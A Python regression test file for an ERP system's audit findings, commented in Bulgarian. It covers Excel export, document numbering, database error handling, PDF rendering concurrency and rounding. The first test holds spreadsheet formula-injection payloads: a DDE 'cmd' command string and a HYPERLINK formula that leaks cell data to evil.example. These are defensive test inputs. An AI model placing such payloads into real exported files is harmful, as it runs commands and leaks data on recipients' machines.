# -*- coding: utf-8 -*-
"""Регресионни тестове за одита от 19.08.2026 (ERP_ОДИТ_2026_08_19.md).

Всяка находка от доклада, чиято поправка може да бъде „изродена" обратно с
една неволна промяна, има тест тук. Тестовете са подредени по номер на
находка, за да може докладът да се чете успоредно с тях."""
import io
import json
import os
import sqlite3
import threading

import pytest

import appcore
import db
from conftest import post_with_csrf


# ---------------------------------------------------------------- №1 (КРИТИЧНА)
# Инжекция на формули в Excel износа

def _export_and_load(admin_client, doc_id):
    from openpyxl import load_workbook
    resp = admin_client.get("/doc/%d/export.xlsx" % doc_id)
    assert resp.status_code == 200
    return load_workbook(io.BytesIO(resp.data)).active


def _make_doc(db_module, data, doc_type="cmr"):
    con = db_module.get_db()
    cur = con.execute(
        "INSERT INTO documents (doc_type, number, year, seq, barcode, public_token,"
        " data, created_by) VALUES (?, '0001/2026', 2026, 1, ?, ?, ?, 1)",
        (doc_type, "BC-%d" % id(data), "tok-%d" % id(data),
         json.dumps(data, ensure_ascii=False)),
    )
    con.commit()
    doc_id = cur.lastrowid
    con.close()
    return doc_id


def test_xlsx_export_never_writes_a_real_formula(admin_client, db_module):
    """Одит (19.08.2026, находка №1, КРИТИЧНА): текстово поле, започващо с
    „=", се записваше в изнесения .xlsx като ИСТИНСКА формула
    (data_type='f') и се изпълняваше на машината на ПОЛУЧАТЕЛЯ (клиент,
    счетоводство, митница). Данните могат да идват отвън — свободните
    полета се пълнят и от Excel импорт."""
    doc_id = _make_doc(db_module, {
        "sender_name": "=cmd|'/c calc'!A0",
        "consignee_name": '=HYPERLINK("http://evil.example/?"&A1,"клик")',
        "goods_desc": "@SUM(1)",
        "items": [{"description": "-2-2", "qty": "1"}],
    })
    ws = _export_and_load(admin_client, doc_id)

    formulas = [(c.coordinate, c.value) for row in ws.iter_rows()
                for c in row if c.data_type == "f"]
    assert formulas == [], (
        "нито една клетка не бива да е формула, а са: %r" % (formulas,))

    # ...и стойността НЕ е изгубена/променена — просто е маркирана като текст.
    values = [c.value for row in ws.iter_rows() for c in row]
    assert "=cmd|'/c calc'!A0" in values
    quoted = [c.value for row in ws.iter_rows() for c in row
              if getattr(c, "quotePrefix", False)]
    assert "=cmd|'/c calc'!A0" in quoted, (
        "опасната стойност трябва да е маркирана с quotePrefix (Excel я "
        "показва като текст, без видим апостроф)")


def test_xlsx_export_keeps_normal_text_untouched(admin_client, db_module):
    """Обратната проверка: обикновен текст НЕ бива да получава quotePrefix
    (иначе целият износ би се маркирал излишно)."""
    doc_id = _make_doc(db_module, {"sender_name": "Пачо ООД", "items": []})
    ws = _export_and_load(admin_client, doc_id)
    quoted = [c.value for row in ws.iter_rows() for c in row
              if getattr(c, "quotePrefix", False)]
    assert "Пачо ООД" not in quoted


# ---------------------------------------------------------------- №2 (КРИТИЧНА)
# Ръчен номер във формата на автоматичните заклещва номерацията

def test_next_number_skips_a_number_already_taken_by_a_manual_entry(db_module):
    """Одит (19.08.2026, находка №2, КРИТИЧНА): ръчен номер „0005/2026"
    заемаше място, до което броячът по-късно стига сам. INSERT-ът гърмеше с
    UNIQUE constraint, извикващият правеше rollback(), който връщаше назад И
    инкремента на брояча (същата транзакция) — следващият опит генерираше
    ТОЧНО СЪЩИЯ зает номер. Безкрайно: този тип документ не можеше да бъде
    издаван автоматично до края на календарната година."""
    con = db_module.get_db()
    con.execute(
        "INSERT INTO documents (doc_type, number, year, seq, barcode, public_token,"
        " data, created_by) VALUES ('invoice_br', '0005/2026', 2026, 1, 'B1', 't1', '{}', 1)")
    con.execute("INSERT OR REPLACE INTO counters (doc_type, year, last)"
                " VALUES ('invoice_br', 2026, 4)")
    con.commit()

    issued = []
    for i in range(3):
        number, year, seq, barcode = db_module.next_number(con, "invoice_br")
        con.execute(
            "INSERT INTO documents (doc_type, number, year, seq, barcode, public_token,"
            " data, created_by) VALUES ('invoice_br', ?, ?, ?, ?, ?, '{}', 1)",
            (number, year, seq, barcode, "tok%d" % i))
        con.commit()
        issued.append(number)

    assert issued == ["0006/2026", "0007/2026", "0008/2026"], (
        "автоматичната номерация трябва да ПРЕСКОЧИ заетия 0005 и да продължи")
    last = con.execute("SELECT last FROM counters WHERE doc_type='invoice_br'"
                       " AND year=2026").fetchone()["last"]
    assert last == 8, "броячът трябва да е фиксиран на прескочената стойност"
    con.close()


def test_next_number_skips_several_consecutive_taken_numbers(db_module):
    con = db_module.get_db()
    for n in (1, 2, 3, 4):
        con.execute(
            "INSERT INTO documents (doc_type, number, year, seq, barcode, public_token,"
            " data, created_by) VALUES ('invoice_no', ?, 2026, ?, ?, ?, '{}', 1)",
            ("%04d/2026" % n, n, "B%d" % n, "t%d" % n))
    con.commit()
    number, _year, seq, _bc = db_module.next_number(con, "invoice_no")
    assert number == "0005/2026" and seq == 5
    con.close()


def test_next_number_gives_up_with_a_clear_error_instead_of_hanging(db_module, monkeypatch):
    """Таванът _MAX_SEQ_SKIPS предпазва от безкраен цикъл при патологични
    данни — по-добре ясна грешка, отколкото увиснало приложение."""
    monkeypatch.setattr(db_module, "_MAX_SEQ_SKIPS", 3)
    con = db_module.get_db()
    for n in range(1, 12):
        con.execute(
            "INSERT INTO documents (doc_type, number, year, seq, barcode, public_token,"
            " data, created_by) VALUES ('cmr', ?, 2026, ?, ?, ?, '{}', 1)",
            ("%04d/2026" % n, n, "B%d" % n, "t%d" % n))
    con.commit()
    with pytest.raises(RuntimeError, match="свободен номер"):
        db_module.next_number(con, "cmr")
    con.close()


# ---------------------------------------------------------------- №3 (КРИТИЧНА)
# Класификаторът на трайно недостъпна база

@pytest.mark.parametrize("exc, expected, label", [
    (sqlite3.DatabaseError("database disk image is malformed"), True, "повредена база"),
    # Одит (25.08.2026, находка №13): схема-разминаването вече НЕ се брои за
    # „недостъпна база“ — то е собственост на is_schema_mismatch_error (виж
    # отделния тест по-долу). Пълната гаранция (собствена 503 страница, без
    # безкраен цикъл) се пази от test_schema_mismatch_gets_its_own_page в
    # test_audit_2026_08_22_gaps.py, независимо от този класификатор.
    (sqlite3.OperationalError("no such column: session_epoch"), False, "стара схема → схема-класификатор"),
    (sqlite3.OperationalError("no such table: users"), False, "липсваща таблица → схема-класификатор"),
    (sqlite3.OperationalError("unable to open database file"), True, "недостъпен файл"),
    (sqlite3.OperationalError("disk I/O error"), True, "I/O грешка"),
    (sqlite3.OperationalError("database is locked"), False, "временно заета"),
    (sqlite3.OperationalError("database table is locked"), False, "временно заета (2)"),
    (sqlite3.IntegrityError("UNIQUE constraint failed"), False, "нарушено ограничение"),
    (sqlite3.ProgrammingError("Incorrect number of bindings"), False, "програмна грешка"),
    (sqlite3.OperationalError('near "FROM": syntax error'), False, "SQL синтаксис"),
    (ValueError("нещо съвсем друго"), False, "несвързано изключение"),
])
def test_db_unavailable_classifier(exc, expected, label):
    """Одит (19.08.2026, находка №3, КРИТИЧНА): първата версия изброяваше
    само три съобщения и пропускаше ПОВРЕДЕНАТА база (`DatabaseError:
    database disk image is malformed` — последствието от критична находка
    К1). Тя падаше в общия клон → redirect към цел, която гърми със същото
    изключение → безкраен цикъл, тоест точно дефектът, който находка №9
    твърдеше, че затваря.

    Одит (25.08.2026, находка №13): разминаването на схемата (`no such
    column/table`) вече е ИЗВАДЕНО оттук — то си има собствен класификатор
    (is_schema_mismatch_error), проверяван ПРЕДИ този, със собствена
    страница. Дублирането беше семантично невярно (база, която чака миграция,
    Е достъпна) и латентен капан. Виж отделния тест точно отдолу.

    ВАЖНО (обратната посока): IntegrityError/ProgrammingError също
    наследяват DatabaseError, но са нормални логически грешки — не бива да
    показват страницата „базата е недостъпна"."""
    assert appcore._is_db_unavailable_error(exc) is expected, label


@pytest.mark.parametrize("msg", ["no such column: session_epoch", "no such table: users"])
def test_schema_mismatch_is_owned_only_by_schema_classifier(msg):
    """Одит (25.08.2026, находка №13): единен собственик на схема-
    разминаването — is_schema_mismatch_error го разпознава, а
    _is_db_unavailable_error вече НЕ (за да не се показва грешната страница,
    ако редът в _handle_unexpected_error някога се размести или класификаторът
    се извика самостоятелно)."""
    exc = sqlite3.OperationalError(msg)
    assert appcore.is_schema_mismatch_error(exc) is True
    assert appcore._is_db_unavailable_error(exc) is False


def test_corrupted_database_shows_503_page_not_an_infinite_redirect(admin_client, db_module):
    """Пълен сценарий: реално повредена база → една статична страница с
    обяснение и статус 503, вместо верига от пренасочвания, която браузърът
    показва като ERR_TOO_MANY_REDIRECTS/бял екран."""
    with open(db_module.DB_PATH, "r+b") as f:
        f.seek(4096)
        f.write(os.urandom(8192))

    resp = admin_client.get("/", follow_redirects=False)

    assert resp.status_code == 503, (
        "повредена база трябва да дава 503 със самостоятелна страница, "
        "а не пренасочване (пренасочването води до безкраен цикъл)")
    body = resp.get_data(as_text=True)
    assert "базата" in body.lower() or "недостъпна" in body.lower()


# ---------------------------------------------------------------- №4, №5
# PDF: паралелни заявки и изтичане на временни шрифтове

def test_pdf_rendering_is_serialised_because_xhtml2pdf_shares_state():
    """Одит (19.08.2026, находка №4): `xhtml2pdf.files.TmpFiles` наследяваше
    `threading.local`, но държеше списъка си като ClassVar с изменяема
    стойност по подразбиране — тоест списъкът беше ОБЩ за всички нишки и
    `cleanFiles()` в края на всяко рендиране трие и чуждите временни
    файлове.

    Одит (03.09.2026, при прилагането на v3.71.0, собствена находка): точно
    това upstream е поправил в xhtml2pdf 0.2.18 (`files` вече се задава в
    `__init__`, изрично коментирано в техния код като поправка на СЪЩИЯ
    клас бъг) — тестът гърмеше твърдо на всеки CI билд, чийто `pip install`
    се спре на 0.2.18 или по-нова версия (изисква само `xhtml2pdf>=0.2.17`
    без горна граница), докато локална разработка с по-стар кеш минаваше.
    Проверено с директен diff на `xhtml2pdf/files.py` между 0.2.17 и 0.2.18.

    Тестът вече ПРОВЕРЯВА реалното споделяне при инсталираната версия и се
    адаптира: ако споделянето още е факт (стара версия), изисква
    `_render_lock`, точно както преди. Ако upstream вече е поправил бъга
    (нова версия), НЕ гърми — но продължава да изисква `_render_lock` да
    съществува: катинарът остава евтина допълнителна защита (сериализирано
    рендиране на PDF не е тясно място в тази програма) и премахването му е
    отделно архитектурно решение, а не нещо, което тестова забележка за
    upstream библиотека трябва да налага мълчаливо."""
    import xhtml2pdf.files as pisa_files
    import pdf_export

    seen = {}

    def worker(name):
        pisa_files.files_tmp.append("маркер-%s" % name)
        seen[name] = list(pisa_files.files_tmp.files)

    try:
        t1 = threading.Thread(target=worker, args=("едно",))
        t1.start(); t1.join()
        t2 = threading.Thread(target=worker, args=("две",))
        t2.start(); t2.join()
        shared = "маркер-едно" in seen["две"]
    finally:
        pisa_files.files_tmp.files.clear()

    if not shared:
        import xhtml2pdf
        applog_note = ("xhtml2pdf %s вече изолира временните файлове ПО НИШКА "
                       "(upstream поправка) — историческото споделяне, заради "
                       "което е писан _render_lock, вече не е факт. Катинарът "
                       "остава като допълнителна защита; премахването му е "
                       "отделно решение, не автоматична последица от тази "
                       "проверка." % getattr(xhtml2pdf, "__version__", "?"))
        print(applog_note)

    assert isinstance(pdf_export._render_lock, type(threading.Lock())), (
        "рендирането трябва да остане сериализирано — независимо дали "
        "споделянето по-горе все още е факт в инсталираната версия на "
        "xhtml2pdf, или upstream вече го е поправил")


def test_parallel_pdf_exports_all_succeed_and_leak_no_font_copies(admin_client, db_module):
    """Реалният сценарий: няколко служители натискат „Изтегли PDF"
    едновременно. Преди поправката част от заявките връщаха flash „PDF
    файлът не можа да се генерира" (TTFError за изтрит от чужда нишка
    временен шрифт), а с `delete=False` всяко рендиране оставяше по едно
    копие на шрифта (~740 KB) в TEMP завинаги."""
    import gc
    import glob
    import tempfile as tf

    import pdf_export

    doc_id = _make_doc(db_module, {
        "sender_name": "Пачо", "consignee_name": "Клиент",
        "goods_desc": "стока", "items": [{"description": "артикул", "qty": "1"}]})
    con = db_module.get_db()
    row = con.execute("SELECT * FROM documents WHERE id = ?", (doc_id,)).fetchone()
    con.close()

    before = set(glob.glob(os.path.join(tf.gettempdir(), "*.ttf")))
    results = []
    lock = threading.Lock()

    def worker():
        for _ in range(3):
            try:
                # Директно рендиране (без Flask клиент) — тук тестваме
                # самия pdf_export, а не маршрута/сесията.
                with appcore.create_app(run_boot_tasks=False).test_request_context():
                    pdf = pdf_export.generate_document_pdf(
                        "ЧМР", row["number"], row["barcode"],
                        [("Изпращач", "Пачо")], [{"description": "а", "qty": "1"}],
                        [("description", "Описание"), ("qty", "Брой")])
                ok = pdf[:4] == b"%PDF"
            except Exception:
                ok = False
            with lock:
                results.append(ok)

    threads = [threading.Thread(target=worker) for _ in range(6)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    gc.collect()

    assert all(results) and len(results) == 18, (
        "всички паралелни PDF рендирания трябва да успеят, а са: %d/%d"
        % (sum(results), len(results)))
    leaked = set(glob.glob(os.path.join(tf.gettempdir(), "*.ttf"))) - before
    assert not leaked, "изтекли копия на шрифта в TEMP: %r" % (leaked,)


# ---------------------------------------------------------------- №7, №8, №43
# Тихо изчезващи стойности

def test_unparsable_quantity_is_reported_not_silently_dropped():
    """Одит (19.08.2026, находка №7, висока): ред с попълнено, но
    неразчитаемо число (напр. „1.234,56" с разделител за хиляди) се ПЕЧАТА
    на бланката, но `invoice_totals` го изключва изцяло от сумата — тоест
    фактура излиза с видим ред за 12 345.60 EUR, който липсва от TOTAL."""
    items = [{"qty": "2", "unit_price": "10.00"},
             {"qty": "1.234,56", "unit_price": "10.00"}]
    assert appcore.invoice_row_total(items[1]) == "", "предпоставката на теста"
    assert appcore.unparsable_item_rows(items) == [2]


def test_empty_fields_are_not_reported_as_unparsable():
    """Празно поле е нормално (много редове нямат тегло/цена) — само
    непразна, но нечислова стойност е проблем."""
    assert appcore.unparsable_item_rows([{"qty": "5", "unit_price": ""}]) == []
    assert appcore.unparsable_item_rows([{"qty": "5", "net_weight": None}]) == []


def test_issuing_an_invoice_with_an_unparsable_row_warns_the_operator(admin_client):
    items = json.dumps([{"material_code": "A", "qty": "1.234,56", "unit_price": "10.00"}])
    resp = post_with_csrf(admin_client, "/invoice-br/new", {
        "consignee_name": "Клиент", "invoice_number": "INV-1", "items_json": items,
    }, csrf_source_url="/invoice-br/new", follow_redirects=True)
    body = resp.get_data(as_text=True)
    assert "не може да бъде разчетено" in body, (
        "операторът трябва да бъде предупреден, че редът не влиза в общата сума")


def test_packing_totals_mismatch_is_detected():
    """Одит (19.08.2026, находка №8, висока): четирите обобщаващи полета на
    опаковъчния лист се преписват на ръка и се печатат буквално в реда
    ОБЩО/TOTAL — без никаква проверка срещу сбора на редовете. Листът
    придружава ЧМР при митническо оформяне."""
    data = {
        "items": [{"qty": "2", "net": "1.5", "gross": "2", "volume": "0.1"},
                  {"qty": "3", "net": "1.375", "gross": "0.7755", "volume": "0.0625"}],
        "total_packages": "5",       # вярно
        "total_net": "1.11",         # ГРЕШНО (реално 2.875)
        "total_gross": "2.22",       # ГРЕШНО (реално 2.776)
        "total_volume": "9.99",      # ГРЕШНО (реално 0.163)
    }
    mismatches = {label for label, _typed, _computed in appcore.packing_total_mismatches(data)}
    assert "Общо нето, кг" in mismatches
    assert "Общо бруто, кг" in mismatches
    assert "Общо обем, м³" in mismatches
    assert "Общо колети" not in mismatches, "вярната стойност не бива да се докладва"


def test_packing_totals_left_empty_are_not_reported():
    """Непопълнено обобщение не е грешка — не всеки лист ги ползва."""
    data = {"items": [{"qty": "2", "net": "1.5"}], "total_net": ""}
    assert appcore.packing_total_mismatches(data) == []


def test_bulk_pallet_issue_warns_about_negative_and_unparsable_rows(admin_client, db_module):
    """Одит (19.08.2026, находка №43): груповото издаване не викаше НИТО
    ЕДНА от проверките, които единичното издаване и редакцията вече правят
    — това е третият вход към същите данни."""
    resp = post_with_csrf(admin_client, "/pallet/bulk-issue", {
        "consignee_name": "Клиент",
        "groups": "1",
        "items_json_1": json.dumps([{"description": "а", "qty": "-5"},
                                    {"description": "б", "qty": "1 000.5"}]),
    }, csrf_source_url="/pallet/new", follow_redirects=True)
    body = resp.get_data(as_text=True)
    assert "отрицателна стойност" in body or "не може да бъде разчетено" in body, (
        "груповото издаване трябва да предупреждава като единичното")


# ---------------------------------------------------------------- №9, №45
# Закръгляне на сумарните количества

@pytest.mark.parametrize("value, expected", [
    ("0.0625", "0.063"),   # половинка НАГОРЕ, не към четно ("%.3f" даваше 0.062)
    ("2.0625", "2.063"),
    ("0.5625", "0.563"),
    ("1.0005", "1.001"),
    ("6.25", "6.25"),      # находка №45: без завършващи нули
    ("2", "2"),
])
def test_pallet_total_qty_rounds_half_up_like_the_browser(value, expected):
    """Одит (19.08.2026, находка №9): JS показваше 0.063, а издаденият
    документ и Excel износът твърдяха 0.062 — Python форматираше float,
    което закръгля половинката към ЧЕТНО. Сега двете страни ползват
    идентична ROUND_HALF_UP аритметика върху суровия текст."""
    assert appcore.pallet_total_qty([{"qty": value}]) == expected


def test_invoice_totals_quantity_and_weight_round_half_up():
    assert appcore.invoice_totals([{"qty": "0.0625", "unit_price": "1"}])["qty"] == "0.063"
    assert appcore.invoice_totals([{"qty": "2.5", "net_weight": "2.5"}])["weight"] == "6.25"


# ---------------------------------------------------------------- №31, №32
# Excel износ: заглавни числа и редът TOTAL

def test_invoice_total_row_includes_the_weight(admin_client, db_module):
    """Одит (19.08.2026, находка №32): колоната „Общо тегло, кг" се пълни по
    редовете и вече е изчислена, но клетката в реда TOTAL оставаше празна —
    получателят трябваше да сумира на ръка точно колоната, заради която
    редът TOTAL изобщо беше добавен."""
    import routes_documents as rd
    items = [{"qty": "2", "net_weight": "1.25", "unit_price": "10"}]
    cols = rd._XLSX_ITEM_COLUMNS.get("invoice_br", [])
    keys = [k for k, _l in cols]
    if "__row_weight__" not in keys:
        pytest.skip("този тип фактура няма колона за тегло")
    row = rd._invoice_export_totals_row("invoice_br", items, cols)
    assert row[keys.index("__row_weight__")] == "2.5"


def test_xlsx_header_numeric_fields_are_written_as_real_numbers(admin_client, db_module):
    """Одит (19.08.2026, находка №31): поправката на №19 (16.08) направи
    РЕДОВЕТЕ числа, но заглавните обобщаващи полета („Общо нето, кг" и
    другите — точно тези, които получателят най-често сумира) останаха
    текст, невъзможен за SUM/сортиране."""
    doc_id = _make_doc(db_module, {
        "total_net": "12.5", "total_gross": "20", "total_packages": "3",
        "total_volume": "0.75",
        "items": [{"description": "а", "qty": "1", "net": "12.5"}],
    }, doc_type="packing")
    ws = _export_and_load(admin_client, doc_id)

    numeric_labels = {"Общо нето, кг", "Общо бруто, кг", "Общо колети", "Общо обем, м³"}
    seen = {}
    for row in ws.iter_rows():
        cells = list(row)
        if len(cells) >= 2 and cells[0].value in numeric_labels:
            seen[cells[0].value] = cells[1].value
    assert seen, "заглавните полета не бяха намерени в износа"
    for label, value in seen.items():
        assert isinstance(value, (int, float)), (
            "„%s\" трябва да е истинско число в Excel, а е %r" % (label, value))
